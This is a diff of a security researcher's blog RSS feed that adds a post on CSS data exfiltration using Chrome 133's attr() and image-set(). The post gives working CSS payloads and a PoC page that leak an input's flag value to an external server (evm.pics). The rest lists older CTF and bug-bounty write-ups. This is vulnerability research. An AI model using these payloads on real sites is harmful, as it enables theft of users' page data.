@@ -2,17 +2,77 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>My New Hugo Site</title>
-    <link>https://blog.404error.life/</link>
+    <link>http://localhost:1313/</link>
     <description>Recent content on My New Hugo Site</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 14 Sep 2023 02:00:53 +0000</lastBuildDate><atom:link href="https://blog.404error.life/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 15 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CSS Exfiltration via attr() &#43; image-set() from Chrome 133</title>
+      <link>http://localhost:1313/posts/2025-04-15-css-exfiltration/</link>
+      <pubDate>Tue, 15 Apr 2025 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/2025-04-15-css-exfiltration/</guid>
+      <description>&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;flag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;background&lt;/span&gt;: url(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://evm.pics/a&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;flag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;background&lt;/span&gt;: url(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://evm.pics/b&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* ... */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In most cases, when exploiting CSS exfiltration, they should have attempted to leak data using a payload like the one shown above. However, the process is often tedious, as each word must be leaked step by step but recently they can leak data at once not leaking as each words after Chrome 133 was released&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;css-attr-gets-an-upgrade-from-chrome-133&#34;&gt;CSS attr() gets an upgrade from Chrome 133&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://media.discordapp.net/attachments/1324169819637022723/1361997721535516823/image.png?ex=6800cab9&amp;amp;is=67ff7939&amp;amp;hm=1a5181d52767c9685d7220a3f9bd3f3a90f369b81c800f85a7f864672049caca&amp;amp;=&amp;amp;format=webp&amp;amp;quality=lossless&amp;amp;width=1420&amp;amp;height=801&#34; alt=&#34;&#34;&gt;&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;flag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;background&lt;/span&gt;: url(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://evm.pics/a&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;flag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;background&lt;/span&gt;: url(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://evm.pics/b&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* ... */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In most cases, when exploiting CSS exfiltration, they should have attempted to leak data using a payload like the one shown above. However, the process is often tedious, as each word must be leaked step by step but recently they can leak data at once not leaking as each words after Chrome 133 was released&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;css-attr-gets-an-upgrade-from-chrome-133&#34;&gt;CSS attr() gets an upgrade from Chrome 133&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://media.discordapp.net/attachments/1324169819637022723/1361997721535516823/image.png?ex=6800cab9&amp;amp;is=67ff7939&amp;amp;hm=1a5181d52767c9685d7220a3f9bd3f3a90f369b81c800f85a7f864672049caca&amp;amp;=&amp;amp;format=webp&amp;amp;quality=lossless&amp;amp;width=1420&amp;amp;height=801&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As you can check attr() function has been upgraded from Chrome 133, means it allows to get attrs data from tags so if attacker can use this function as well, the data will be leaked all data at once, i.e, words, they don&amp;rsquo;t need to leak each word step by step&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag{css-csscscscscscscs}&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;let&amp;rsquo;s say there is an example like this. In the past, we would probably try to leak one word at a time but we don&amp;rsquo;t need to do that anymore we can just leak all data at once via attr()&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;payload-to-leak-data&#34;&gt;Payload to Leak data&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;--val&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;attr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;flag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;background&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;url&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--val&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;));&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;Invalid&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;First of all, we can&amp;rsquo;t use url() since it was blocked for security so need to use image-set() function to leak data to external url&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      --val: attr(flag);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;background&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;image-set&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;var&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;val));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The payload can be written like this and image-set() function load resources based on the base URL so we should add the &amp;lt;link&amp;gt; tag to web page where the sensitive data is located&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;CSS attr() PoC&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;link&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rel&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://evm.pics/poc/exfiltration1.css&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag{css-csscscscscscscs}&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Create the HTML file then open it&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://media.discordapp.net/attachments/1324169819637022723/1362005721788583936/image.png?ex=6800d22c&amp;amp;is=67ff80ac&amp;amp;hm=5bad1fe96a5bc51b0db5efa7c76a2f81c1bfe4c8c56542736dc0b942126368a0&amp;amp;=&amp;amp;format=webp&amp;amp;quality=lossless&amp;amp;width=993&amp;amp;height=223&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can check that the flag was leaked to attacker&amp;rsquo;s server&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>($10,890) What is XSS in the ML/AI ecosystem, not only web3.0?</title>
-      <link>https://blog.404error.life/posts/2023-09-14-xss-in-ml-framework/</link>
+      <link>http://localhost:1313/posts/2023-09-14-xss-in-ml-framework/</link>
       <pubDate>Thu, 14 Sep 2023 02:00:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2023-09-14-xss-in-ml-framework/</guid>
+      <guid>http://localhost:1313/posts/2023-09-14-xss-in-ml-framework/</guid>
       <description>&lt;p&gt;Hi guys, i wanna introduce a way to earn $10k bounty on an open-source projects. a month ago, i reported a bug in the ML Framework. and the bug i found was not critical so i needed to find a way to escalate it low-severity to high-severity. first of all, the bug i found was xss. i know that most people think that is not the bug which has high severity but me and others know a way to exploit scenario via low-severity bug.&lt;/p&gt;</description>
       <content>&lt;p&gt;Hi guys, i wanna introduce a way to earn $10k bounty on an open-source projects. a month ago, i reported a bug in the ML Framework. and the bug i found was not critical so i needed to find a way to escalate it low-severity to high-severity. first of all, the bug i found was xss. i know that most people think that is not the bug which has high severity but me and others know a way to exploit scenario via low-severity bug.&lt;/p&gt;
 &lt;ul&gt;
@@ -30,10 +90,10 @@
     
     <item>
       <title>0-Day, Copy and Paste ReDoS in github.com</title>
-      <link>https://blog.404error.life/posts/2023-08-05-redos-in-github/</link>
+      <link>http://localhost:1313/posts/2023-08-05-redos-in-github/</link>
       <pubDate>Sat, 05 Aug 2023 09:00:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2023-08-05-redos-in-github/</guid>
+      <guid>http://localhost:1313/posts/2023-08-05-redos-in-github/</guid>
       <description>&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
 &lt;p&gt;In summary, I found a Self-ReDoS vulnerability in the issue feature of github.com and reported it to HackerOne.&lt;/p&gt;
 &lt;!-- raw HTML omitted --&gt;
@@ -131,10 +191,10 @@ If ReDoS does not occur within the generateText() function, the code execution w
     
     <item>
       <title>Line CTF 2023 Write Up</title>
-      <link>https://blog.404error.life/posts/2023-03-26-line-ctf/</link>
+      <link>http://localhost:1313/posts/2023-03-26-line-ctf/</link>
       <pubDate>Sun, 26 Mar 2023 09:00:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2023-03-26-line-ctf/</guid>
+      <guid>http://localhost:1313/posts/2023-03-26-line-ctf/</guid>
       <description>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;#web-baby-simple-gocurl&#34;&gt;(Web) Baby Simple Gocurl &lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;#web-adult-simple-gocurl&#34;&gt;(Web) Adult Simple Gocurl&lt;/a&gt;&lt;/li&gt;
@@ -288,10 +348,10 @@ Location: http://localhost:8624/test-service/docs/index.html
     
     <item>
       <title>HTB apocalypse CTF 2023 spybug Write Up</title>
-      <link>https://blog.404error.life/posts/2023-03-23-htbctf2023/</link>
+      <link>http://localhost:1313/posts/2023-03-23-htbctf2023/</link>
       <pubDate>Thu, 23 Mar 2023 22:13:49 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2023-03-23-htbctf2023/</guid>
+      <guid>http://localhost:1313/posts/2023-03-23-htbctf2023/</guid>
       <description>&lt;h3 id=&#34;spybug&#34;&gt;spybug&lt;/h3&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dotenv&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;config&lt;/span&gt;();
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
@@ -515,10 +575,10 @@ this regular expression is the logic to check the signature code of the wav file
     
     <item>
       <title>b01lers CTF 2023 Write Up</title>
-      <link>https://blog.404error.life/posts/2023-03-19-b01lers/</link>
+      <link>http://localhost:1313/posts/2023-03-19-b01lers/</link>
       <pubDate>Sun, 19 Mar 2023 22:13:49 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2023-03-19-b01lers/</guid>
+      <guid>http://localhost:1313/posts/2023-03-19-b01lers/</guid>
       <description>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
 &lt;p&gt;Cause I was lazy, I didn&amp;rsquo;t do ctf for a long time. If i say &amp;ldquo;cause I was busy&amp;rdquo;, it looks fucking stupid. When I&amp;rsquo;m solving, the time of ctf is only 5 hours, so i just decided to solve the web challenge&lt;/p&gt;
 &lt;hr&gt;
@@ -729,10 +789,10 @@ this regular expression is the logic to check the signature code of the wav file
     
     <item>
       <title>Express, RCE via File Extension Confusing ≤ V4.18.2</title>
-      <link>https://blog.404error.life/posts/2022-12-18-rce-express-1/</link>
+      <link>http://localhost:1313/posts/2022-12-18-rce-express-1/</link>
       <pubDate>Sun, 18 Dec 2022 21:41:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-12-18-rce-express-1/</guid>
+      <guid>http://localhost:1313/posts/2022-12-18-rce-express-1/</guid>
       <description>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;#summary&#34;&gt;Summary&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;#function-call-procedure&#34;&gt;Function call procedure&lt;/a&gt;&lt;/li&gt;
@@ -976,10 +1036,10 @@ this regular expression is the logic to check the signature code of the wav file
     
     <item>
       <title>Express, Querystring parameter limit of req.query</title>
-      <link>https://blog.404error.life/posts/2022-11-19-logic-req.query/</link>
+      <link>http://localhost:1313/posts/2022-11-19-logic-req.query/</link>
       <pubDate>Sat, 19 Nov 2022 21:41:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-11-19-logic-req.query/</guid>
+      <guid>http://localhost:1313/posts/2022-11-19-logic-req.query/</guid>
       <description>&lt;h3 id=&#34;summary&#34;&gt;Summary&lt;/h3&gt;
 &lt;p&gt;few days ago, i found an interesting logic in req.query() and call the qs module inside req.query(). the qs module limits a number of parameter and default limit number is 1000.&lt;/p&gt;
 &lt;p&gt;so if we send more than 1000 parameters, server will not read any more after the 1000th parameter.&lt;/p&gt;
@@ -1183,10 +1243,10 @@ this regular expression is the logic to check the signature code of the wav file
     
     <item>
       <title>CCE 2022 Write Up</title>
-      <link>https://blog.404error.life/posts/2022-09-25-cce/</link>
+      <link>http://localhost:1313/posts/2022-09-25-cce/</link>
       <pubDate>Sun, 25 Sep 2022 04:00:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-09-25-cce/</guid>
+      <guid>http://localhost:1313/posts/2022-09-25-cce/</guid>
       <description>&lt;p&gt;After a long time I did ctf again. Actually, a few days ago, 김지섭님, a member of zer0pt, asked me to do CCE together, but I refused. The reason was because of work.&lt;/p&gt;
 &lt;p&gt;But I was able to find 5 XSS from ** by concentrating on my work. And maybe if i was with him, it would have been the first and last CCE general finals of my life XD&lt;/p&gt;</description>
       <content>&lt;p&gt;After a long time I did ctf again. Actually, a few days ago, 김지섭님, a member of zer0pt, asked me to do CCE together, but I refused. The reason was because of work.&lt;/p&gt;
@@ -1472,10 +1532,10 @@ this regular expression is the logic to check the signature code of the wav file
     
     <item>
       <title>SSTF 2022 JWT Decoder Write Up</title>
-      <link>https://blog.404error.life/posts/2022-08-23-sstf/</link>
+      <link>http://localhost:1313/posts/2022-08-23-sstf/</link>
       <pubDate>Tue, 23 Aug 2022 04:00:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-08-23-sstf/</guid>
+      <guid>http://localhost:1313/posts/2022-08-23-sstf/</guid>
       <description>&lt;p&gt;I participated in the CTF called sstf after 5 months. Today, I wrote that how to solve a JWT Decoder.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;~/Downloads/prob
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ tree -I &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;node_modules&amp;#34;&lt;/span&gt;
@@ -1662,10 +1722,10 @@ this regular expression is the logic to check the signature code of the wav file
     
     <item>
       <title>Outlook, XSS Sanitizer flaw</title>
-      <link>https://blog.404error.life/posts/2022-06-06-msrc-1/</link>
+      <link>http://localhost:1313/posts/2022-06-06-msrc-1/</link>
       <pubDate>Mon, 06 Jun 2022 12:34:45 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-06-06-msrc-1/</guid>
+      <guid>http://localhost:1313/posts/2022-06-06-msrc-1/</guid>
       <description>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://media.discordapp.net/attachments/1324169819637022723/1324169831590658078/image.png?ex=67772cc1&amp;amp;is=6775db41&amp;amp;hm=eb96d8721d6db7bdd17435b4ffdbb0e3b37d9ad1def3e3824f524336becc11d7&amp;amp;=&amp;amp;format=webp&amp;amp;quality=lossless&amp;amp;width=2002&amp;amp;height=65&#34; alt=&#34;&#34;&gt;
 The outlook web app service is a mail service provided by Microsoft. A researcher named Max discovered a Copy and Paste XSS vulnerability in the web service in 2021.&lt;/p&gt;
@@ -1709,10 +1769,10 @@ The outlook web app service is a mail service provided by Microsoft. A researche
     
     <item>
       <title>Dreamhack, Leak all write ups via IDOR</title>
-      <link>https://blog.404error.life/posts/2022-05-15-idor-dr/</link>
+      <link>http://localhost:1313/posts/2022-05-15-idor-dr/</link>
       <pubDate>Mon, 16 May 2022 12:34:45 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-05-15-idor-dr/</guid>
+      <guid>http://localhost:1313/posts/2022-05-15-idor-dr/</guid>
       <description>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
 &lt;blockquote&gt;
 &lt;p&gt;The dreamhack is a security education program managed by Theori. In dreamhack, Users can solve wargame challenges and write solutions. At this time, the user can write the solution for a fee/free of charge.&lt;/p&gt;
@@ -1760,10 +1820,10 @@ The outlook web app service is a mail service provided by Microsoft. A researche
     
     <item>
       <title>0-Day, Cross-Site Scripting via markdown syntax (Vditor)</title>
-      <link>https://blog.404error.life/posts/2022-04-02-xss-vditor/</link>
+      <link>http://localhost:1313/posts/2022-04-02-xss-vditor/</link>
       <pubDate>Sat, 02 Apr 2022 12:34:45 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-04-02-xss-vditor/</guid>
+      <guid>http://localhost:1313/posts/2022-04-02-xss-vditor/</guid>
       <description>&lt;h3 id=&#34;summary&#34;&gt;Summary&lt;/h3&gt;
 &lt;blockquote&gt;
 &lt;p&gt;The vanessa219/vditor is a markdown editor supported by browsers. There were two vulnerabilities.&lt;/p&gt;
@@ -1852,10 +1912,10 @@ The outlook web app service is a mail service provided by Microsoft. A researche
     
     <item>
       <title>Line CTF 2022 Write Up</title>
-      <link>https://blog.404error.life/posts/2022-03-27-line-ctf/</link>
+      <link>http://localhost:1313/posts/2022-03-27-line-ctf/</link>
       <pubDate>Sun, 27 Mar 2022 09:00:53 +0000</pubDate>
       
